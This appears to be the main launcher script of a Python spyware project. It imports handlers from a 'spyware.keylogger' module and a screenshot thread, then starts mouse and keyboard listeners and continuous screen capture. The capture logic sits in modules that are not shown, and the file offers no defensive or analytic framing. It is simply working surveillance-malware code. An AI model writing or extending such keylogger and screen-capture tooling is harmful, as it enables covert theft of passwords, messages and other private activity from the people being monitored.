from pynput import mouse, keyboard

from spyware.keylogger import on_click, on_press
from spyware.screenshot import ScreenshotThread

if __name__ == '__main__':
    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    screenshot_consumer = ScreenshotThread()
    screenshot_consumer.start()

    mouse_listener.join()
    keyboard_listener.join()
    screenshot_consumer.join()